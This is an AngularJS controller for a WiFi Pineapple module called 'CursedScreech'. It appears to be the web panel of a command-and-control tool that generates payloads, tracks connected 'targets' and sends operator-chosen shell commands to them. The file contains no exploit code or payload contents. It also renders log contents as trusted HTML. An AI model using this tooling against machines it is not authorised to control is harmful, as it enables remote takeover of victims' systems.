registerController('CursedScreechController', ['$api', '$scope', '$sce', '$interval', function($api, $scope, $sce, $interval) {
	
	// Throbbers
	$scope.showSettingsThrobber	= false;
	$scope.showSeinThrobber		= false;
	$scope.showKuroThrobber		= false;
	
	// Depends vars
	$scope.dependsProcessing	= false;
	$scope.dependsInstalled		= false;
	
	// Settings vars
	$scope.settings_mcastGroup	= '';
	$scope.settings_mcastPort	= '';
	$scope.settings_hb_interval	= '';
	$scope.settings_kuroKey		= '';
	$scope.settings_targetKey	= '';
	$scope.settings_auth		= false;
	
	// Proc statuses
	$scope.seinStatus			= 'Not Running';
	$scope.seinButton			= 'Start';
	$scope.kuroStatus			= 'Not Running';
	$scope.kuroButton			= 'Start';
	
	// Log vars
	$scope.currentLogTitle		= '';
	$scope.currentLogData		= '';
	$scope.activityLogData		= '';
	$scope.targets				= [];
	$scope.allTargetLogs		= [];
	
	// Key vars
	$scope.certificates			= '';
	$scope.keyErrorMessage		= '';
	$scope.selectKuroKey		= false;
	$scope.selectTargetKey		= false;
	
	// Target Commands
	$scope.targetCommand		= "";
	$scope.ezcmds				= [];
	$scope.selectedCmd			= "";
	$scope.newCmdName			= "";
	$scope.newCmdCommand		= "";
	$scope.checkAllTargets		= false;
	
	// Interval vars
	$scope.stop;
	
	/* ============================================= */
	/*            BEGIN DEPENDS FUNCTIONS            */
	/* ============================================= */
	
	$scope.depends = (function(task){
		if (task == "install" || task == "remove") {
			$scope.dependsProcessing = true;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'depends',
			task: task
		},function(response) {
			if (task == "install") {
				$scope.dependsProcessing = false;
				if (response.success === false) {
					alert("Failed to install dependencies.  Make sure you are connected to the internet.");
				} else {
					$scope.depends("check");
				}
			} else if (task == "remove") {
				$scope.dependsProcessing = false;
				$scope.depends("check");
			} else if (task == "check") {
				$scope.dependsInstalled = (response.success === true) ? true : false;
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN SETTINGS FUNCTIONS           */
	/* ============================================= */
	
	$scope.loadSettings = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadSettings'
		},function(response){
			if (response.success === true) {
				var configs = response.data;
				$scope.settings_mcastGroup = configs.mcast_group;
				$scope.settings_mcastPort = configs.mcast_port;
				$scope.settings_hb_interval = configs.hb_interval;
				$scope.settings_kuroKey = configs.kuro_key;
				$scope.settings_targetKey = configs.target_key;
				$scope.settings_auth = (configs.auth == 1) ? true : false;
			}
		});
	});
	
	$scope.updateSettings = (function(){
		$scope.showSettingsThrobber = true;
		// Add the settings variables to a dictionary
		data = {
			'mcast_group': $scope.settings_mcastGroup,
			'mcast_port': $scope.settings_mcastPort,
			'hb_interval': $scope.settings_hb_interval,
			'kuro_key': $scope.settings_kuroKey,
			'target_key': $scope.settings_targetKey,
			'auth': $scope.settings_auth
		};
		
		// Make the request to update the settings
		$api.request({
			module: 'CursedScreech',
			action: 'updateSettings',
			settings: data
		},function(response) {
			if (response.success === true) {
				$scope.loadSettings();
			}
			$scope.showSettingsThrobber = false;
		});
	});
	
	$scope.useDefault = (function(setting){
		if (setting == "mcast_group") {
			$scope.settings_mcastGroup = '231.253.78.29';
		} else if (setting == "mcast_port") {
			$scope.settings_mcastPort = '19578';
		} else if (setting == "hb_interval") {
			$scope.settings_hb_interval = "5";
		} else if (setting == "auth") {
			$scope.settings_auth = false;
		}
	});

	
	/* ============================================= */
	/*            BEGIN PROCESS FUNCTIONS            */
	/* ============================================= */
	
	$scope.startProc = (function(name){
		if (name == "sein.py") {
			$scope.showSeinThrobber	= true;
		} else if (name == "kuro.py") {
			$scope.showKuroThrobber = true;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'startProc',
			procName: name
		},function(response) {
			if (name == "sein.py") {
				if (response.success === true){
					$scope.seinStatus = "Running - PID: " + response.data;
					$scope.seinButton = "Stop";
				}
				$scope.showSeinThrobber	= false;
			} else if (name == "kuro.py") {
				if (response.success === true) {
					$scope.kuroStatus = "Running - PID: " + response.data;
					$scope.kuroButton = "Stop";
				}
				$scope.showKuroThrobber = false;
			}
		});
	});
	
	$scope.procStatus = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'procStatus',
			procName: name
		},function(response){
			//console.log(response);
			if (response.success == true) {
				if (name == "sein.py") {
					$scope.seinStatus = "Running - PID: " + response.data;
					$scope.seinButton = "Stop";
				} else if (name == "kuro.py") {
					$scope.kuroStatus = "Running - PID: " + response.data;
					$scope.kuroButton = "Stop";
				}
			} else {
				if (name == "sein.py") {
					$scope.seinStatus = "Not Running";
					$scope.seinButton = "Start";
				} else if (name == "kuro.py") {
					$scope.kuroStatus = "Not Running";
					$scope.kuroButton = "Start";
				}
			}
		});
	});
	
	$scope.stopProc = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'stopProc',
			procName: name
		},function(response) {
			if (response.success === true){
				if (name == "sein.py") {
					$scope.seinStatus = "Not Running";
					$scope.seinButton = "Start";
				} else if (name == "kuro.py") {
					$scope.kuroStatus = "Not Running";
					$scope.kuroButton = "Start";
				}
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN PAYLOAD FUNCTIONS            */
	/* ============================================= */
	
	$scope.genPayload = (function(type){
		
		// Check if PortalAuth authorization should be used
		// if so change the type to 'cs_auth'
		if (type == "cs" && $scope.settings_auth == true) {
			type = "cs_auth";
		}
		
		$api.request({
			module: 'CursedScreech',
			action: 'genPayload',
			type: type
		},function(response) {
			if (response.success === true) {
				window.location = '/api/?download=' + response.data;
			} else {
				console.log("Failed to archive payload files");
			}
		});
	});
	
	$scope.clearDownloads = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'clearDownloads'
		},function(response){
			if (response.success === false){
				console.log("Failed to clear API downloads directory.");
			}
		});
	});
	
	/* ============================================= */
	/*            BEGIN TARGET FUNCTIONS             */
	/* ============================================= */
	
	$scope.sendCommand = (function(){
		if ($scope.targetCommand == "") {
			return;
		}
		
		var checkedTargets = []
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.targets[x].checked) {
				checkedTargets.push($scope.targets[x].socket.split(":")[0]);
			}
		}
		if (checkedTargets.length == 0) {
			return;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'sendCommand',
			command: $scope.targetCommand,
			targets: checkedTargets
		},function(response){});
	});
	
	function getTargetIndex(sock){
		var addr = sock.split(":")[0];
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.targets[x].socket.split(":")[0] == addr){
				return x;
			}
		}
	}
	
	function itemExistsInList(item,list){
		for (var x=0; x < list.length; x++){
			if (list[x] == item) {
				return x;
			}
		}
	}
	
	$scope.selectAllTargets = (function(){
		if ($scope.checkAllTargets) {
			// Set to false if currently true
			$scope.checkAllTargets = false;
		} else {
			$scope.checkAllTargets = true;
		}
		for (var x=0; x < $scope.targets.length; x++){
			if ($scope.checkAllTargets) {
				$scope.targets[x].checked = true;
			} else {
				$scope.targets[x].checked = false;
			}
		}
	});
	
	$scope.loadTargets = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'loadTargets'
		},function(response){
			if (response.success === true) {
				var index;
				// Load all targets from the Sein list into our local list
				// if any currently exist then update their information
				for (var x=0; x < response.data.length; x++) {
					index = getTargetIndex(response.data[x])
					if (index !== undefined) {
						$scope.targets[index].socket = response.data[x];
					} else {
						$scope.targets.push({'socket': response.data[x], 'checked': false});
					}
				}
				
				// Check the opposite - if the target exists in our local list but not in
				// the list provided it must be deleted from our local list
				for (var x=0; x < $scope.targets.length; x++){
					if (itemExistsInList($scope.targets[x].socket, response.data) === undefined) {
						// Remove item from scope.targets
						index = getTargetIndex($scope.targets[x].socket);
						$scope.targets.splice(index, 1);
					}
				}
			} else {
				console.log(response.message);
			}
		});
	});
	
	$scope.clearTargets = (function(){
		$scope.clearLog('targets.log', 'forest');
		$scope.targets = [];
	});
	
	$scope.deleteTarget = (function(name){
		$api.request({
			module: 'CursedScreech',
			action: 'deleteTarget',
			target: name
		},function(response){
			$scope.loadTargets();
		});
	});
	
	
	/* ============================================= */
	/*            BEGIN EZCMDS FUNCTIONS             */
	/* ============================================= */
	
	$scope.loadEZCmds = (function(){
		$scope.ezcmdKeys = [];
		$api.request({
			module: 'CursedScreech',
			action: 'loadEZCmds'
		},function(response){
			for (k in response.data) {
				if (response.data[k] == null) {
					delete(response.data[k]);
				}
			}
			$scope.ezcmds = response.data;
		});
	});
	
	$scope.saveEZCmds = (function(){
		$api.request({
			module: 'CursedScreech',
			action: 'saveEZCmds',
			ezcmds: $scope.ezcmds
		},function(response){
			if (response.success === true){
				
			}
		});
	});
	
	$scope.deleteEZCmd = (function(key){
		if (!confirm("Delete " + key + "?")) {
			return;
		}
		for (k in $scope.ezcmds) {
			if (k == key) {
				delete($scope.ezcmds[k]);
				$scope.saveEZCmds();
			}
		}
	});
	
	$scope.addEZCmd = (function(){
		if (!$scope.newCmdName || !$scope.newCmdCommand) {
			return;
		}
		$scope.ezcmds[$scope.newCmdName] = $scope.newCmdCommand;
		$scope.saveEZCmds();
		$scope.newCmdName = $scope.newCmdCommand = "";
	});
	
	$scope.ezCommandChange = (function(){
		if ($scope.selectedCmd === null) {
			return;
		}
		$scope.targetCommand = $scope.selectedCmd;
	});
	
	
	/* ============================================= */
	/*              BEGIN KEY FUNCTIONS              */
	/* ============================================= */
	
	$scope.loadCertificates = (function(type) {
		if (type == "kuro") {
			$scope.selectKuroKey = true;
			$scope.selectTargetKey = false;
		} else if (type == "target") {
			$scope.selectTargetKey = true;
			$scope.selectKuroKey = false;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'loadCertificates'
		},function(response){
			if (response.success === true) {
				// Display certificate information
				$scope.keyErrorMessage = '';
				$scope.certificates = response.data;
			} else {
				// Display error
				$scope.keyErrorMessage = response.message;
			}
		});
	});
	
	$scope.selectKey = (function(key){
		keyPath = "/pineapple/modules/Papers/includes/ssl/" + key;
		if ($scope.selectKuroKey == true) {
			$scope.settings_kuroKey = keyPath;
		} else if ($scope.selectTargetKey == true) {
			$scope.settings_targetKey = keyPath;
		}
	});
	
	/* ============================================= */
	/*               BEGIN LOG FUNCTIONS             */
	/* ============================================= */
	
	$scope.getLogs = (function(type){
		/* valid types are error or changelog */
		$api.request({
			module: 'CursedScreech',
			action: 'getLogs',
			type: type
		},function(response){
			if (type == 'error') {
				$scope.logs = response.data;
			} else if (type == 'changelog') {
				$scope.changelogs = response.data;
			} else if (type == 'targets') {
				$scope.allTargetLogs = response.data;
			}
		});
	});
	
	$scope.readLog = (function(log,type){
		$api.request({
			module: 'CursedScreech',
			action: 'readLog',
			logName: log,
			type: type
		},function(response){
			if (response.success === true) {
				if (log == 'activity.log') {
					$scope.activityLogData = response.data;
				} else {
					$scope.currentLogTitle = log;
					$scope.currentLogData = $sce.trustAsHtml(response.data);
				}
			}
		});
	});
	
	$scope.downloadLog = (function(name,type){
		$api.request({
			module: 'CursedScreech',
			action: 'downloadLog',
			logName: name,
			logType: type
		},function(response){
			if (response.success === true) {
				window.location = '/api/?download=' + response.data;
			}
		});
	});
	
	$scope.clearLog = (function(log,type){
		$api.request({
			module: 'CursedScreech',
			action: 'clearLog',
			logName: log,
			type: type
		},function(response){});
	});

	$scope.deleteLog = (function(log, type){
		if (!confirm("Delete " + log + "?")) {
			return;
		}
		$api.request({
			module: 'CursedScreech',
			action: 'deleteLog',
			logName: log,
			type: type
		},function(response){
			if (type == 'targets') {
				$scope.getLogs('targets');
			}
			if (response.success === false) {
				alert(response.message);
			}
		});
	});
	
	$scope.refreshLogs = (function(){
		$scope.getLogs("error");
		$scope.loadTargets();
		$scope.readLog("activity.log", "forest");
	});
	
	
	/* ============================================= */
	/*                  INITIALIZERS                 */
	/* ============================================= */
	
	// Not sure if this is ever reached
	$scope.$on('$destroy', function(){
		$interval.cancel($scope.stop);
		$scope.stop = undefined;
	});
	
	$scope.loadSettings();
	$scope.loadEZCmds();
	$scope.getLogs('changelog');
	$scope.depends('check');
	$scope.clearDownloads();
	
	$scope.stop = $interval(function(){
		$scope.refreshLogs();
		$scope.procStatus('sein.py');
		$scope.procStatus('kuro.py');
	}, 2000);
	
}])